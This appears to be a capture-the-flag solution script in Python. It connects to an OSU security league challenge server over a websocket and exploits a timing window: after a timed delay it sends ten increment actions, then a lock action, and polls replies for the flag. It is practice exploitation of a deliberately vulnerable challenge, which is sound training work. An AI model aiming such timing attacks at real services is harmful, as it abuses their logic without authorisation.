import asyncio
import json
import time

import websockets as webs

INCREMENT = json.dumps({"action":"increment"})
LOCK = json.dumps({"action":"lock"})

async def main():
    async with webs.connect("ws://chal.ctf-league.osusec.org:1329") as ws:
        # network latency :)
        await asyncio.sleep(0.980)
        for i in range(10):
            await ws.send(INCREMENT)

        await ws.send(LOCK)
        
        tries = 0
        # just print like everything lmao
        while "OSU" not in (res := await ws.recv()):
            tries += 1
            
            if tries > 15:
                print("Unable to get flag this time :(")
                break

        # yes else can be used with while loops, this is probably like *the* use case for it :)
        else:
            flag = json.loads(res)["flag"]
            print("Flag:", flag)

if __name__ == "__main__":
    asyncio.run(main())
